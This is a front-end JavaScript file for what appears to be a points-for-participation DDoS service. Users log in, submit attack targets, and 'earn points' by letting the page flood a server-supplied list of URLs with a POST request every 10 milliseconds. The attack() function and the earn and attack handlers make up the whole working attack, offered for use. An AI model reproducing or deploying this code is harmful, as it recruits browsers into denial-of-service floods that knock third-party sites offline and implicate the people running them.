let id = "";
let password = "";
document.getElementById("attackBtn").addEventListener("click", function () {
    if (id === "" || password === "") {
        alert("Please login first");
        return;
    }
    document.getElementById("attackBtn").disabled = true;
    const options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            target: document.getElementById("target").value.replace('\"', ''),
            account: id,
            token: password
        })
    };
    fetch("/api/request", options)
        .then(response => response.json())
        .then(data => {
            if (data.status === "success") {
                alert("Attack request sent successfully");
            }
            else {
                alert("Attack request failed" + data.message);
            }
        });
});
document.getElementById("loginBtn").addEventListener("click", function () {
    id = document.getElementById("username").value;
    password = document.getElementById("password").value;
    alert("Auth infomaion is set");
});
document.getElementById("signupBtn").addEventListener("click", function () {
    const options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            id: document.getElementById("username").value,
            password: document.getElementById("password").value
        })
    };
    fetch("/api/signup", options)
        .then(response => response.json())
        .then(data => {
            if (data.status === "success") {
                alert("Signup success");
                id = document.getElementById("username").value
                password = document.getElementById("password").value
            }
            else {
                alert("Signup failed" + data.message);
            }
        });
});
let earning = false;
document.getElementById("earnBtn").addEventListener("click", function () {
    if (id === "" || password === "") {
        alert("Please login first");
        return;
    }
    if (earning) {
        clearInterval(interval);
        earning = false;
        document.getElementById("earnBtn").innerText = "Earn points";
        fetch("/api/earn", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                account: id,
                token: password,
                count: count
            })
        });
        count = 0;
        return;
    }
    earning = true;
    document.getElementById("earnBtn").innerText = "Stop Earning";
    const options = {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            account: id,
            token: password
        })
    };
    fetch("/api/earn", options)
        .then(response => response.json())
        .then(data => {
            if (data.status === "success") {
                attack(data.targets);
            }
            else {
                alert("Earn failed" + data.message);
                document.getElementById("earnBtn").innerText = "Earn points";
                earning = false;
            }
        });
});
let interval = null;
let count = 0;
function attack(targets) {
    let i = 0;
    interval = setInterval(() => {
        const options = {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: "HelloIamMINDOS"
        };
        fetch(targets[i], options).then(() => {
            count++;
        });
        i++;
        if (i === targets.length) {
            i = 0;
        }
    }, 10);
}
